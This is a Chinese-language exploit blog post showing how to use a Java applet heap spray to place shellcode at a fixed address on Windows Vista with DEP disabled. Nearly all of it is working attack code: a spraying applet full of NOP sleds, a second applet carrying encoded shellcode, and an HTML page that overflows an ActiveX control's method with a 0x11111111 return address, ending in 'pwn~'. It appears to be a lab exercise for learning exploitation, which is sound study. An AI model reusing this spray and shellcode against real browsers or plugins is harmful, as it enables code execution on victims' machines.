---
layout:		post
title:		利用Java applet heap spray技术定位内存地址
author:		wooy0ung
tags:		windows
category:  	exploit
---


>[分析环境]  
>系统: Windows vista Professional sp0 x86  
>编译器: Visual Studio 2008  
>调试器: OllyDbg 1.10  
>JRE版本: 1.4.2_06  
>注意: 关闭系统DEP  
<!-- more -->


新建AppletSpray.java, 贴入以下代码

```
//AppletSpray.java

import java.applet.*;
import java.awt.*;

public class AppletSpray extends Applet{
	public void init(){
		String[] mem=new String[1024];
		StringBuffer buffer=new StringBuffer(0x100000/2);
		buffer.append("\u8281\u8182");
		for(int i=0;i<(0x100000-16)/2;i++)
			buffer.append('\u9090');
		Runtime.getRuntime().gc();
		for(int j=0;j<90;j++)
			mem[j]+=buffer.toString();
	}
}
```

编译Applet

```
> javac path\to\*.java -target 1.1
```

新建test.html, 贴入以下代码

```
<html>
<body>
<applet code=AppletSpray.class width=300 height=50></applet>
<script>alert("开始溢出!");</script>
</body>
</html>
```

OD附加上去, 在内存检索0x81828281

![](/assets/img/exploit/2017-12-30-break-aslr-java-applet-heap-spray/0x00.png)

重启后

![](/assets/img/exploit/2017-12-30-break-aslr-java-applet-heap-spray/0x01.png)

选择0x11111111作为稳定的跳转地址, 填充shellcode

```
//exp.java

import java.applet.*;
import java.awt.*;

public class exp extends Applet{
	public void init(){
		String shellcode="\ud231\u30b2\u8b64\u8b12\u0c52\u528b\u8b1c\u0842" +
            	"\u728b\u8b20\u8012\u0c7e\u7533\u89f2\u03c7\u3c78" +
            	"\u578b\u0178\u8bc2\u207a\uc701\ued31\u348b\u01af" +
            	"\u45c6\u3e81\u6146\u6174\uf275\u7e81\u4508\u6978" +
            	"\u7574\u8be9\u247a\uc701\u8b66\u6f2c\u7a8b\u011c" +
            	"\u8bc7\uaf7c\u01fc\u68c7\u2067\u0120\u7968\u7530" +
            	"\u686e\u7720\u6f6f\ue189\u49fe\u310b\u51c0\uff50" +
            	"\u90d7";
		String[] mem=new String[1024];
		StringBuffer buffer=new StringBuffer(0x100000/2);
		for(int i=0;i<(0x100000-14)/2-shellcode.length();i++)
			buffer.append('\u9090');
		buffer.append(shellcode);
		Runtime.getRuntime().gc();
		for(int j=0;j<90;j++)
			mem[j]+=buffer.toString();
	}
}
```

新建exp.html

```
<html>
<body>
<applet code=exp.class width=300 height=50></applet>
<object classid="clsid:A5E74D94-AAB9-4A83-8216-250BA9D9E578" id="test"></object>
<script>
var s = "\u9090";
while(s.length < 54){
	s += "\u9090";
}
s += "\u1111\u1111";
test.test(s);
</script>
</body>
</html>
```

pwn~

![](/assets/img/exploit/2017-12-30-break-aslr-java-applet-heap-spray/0x02.png)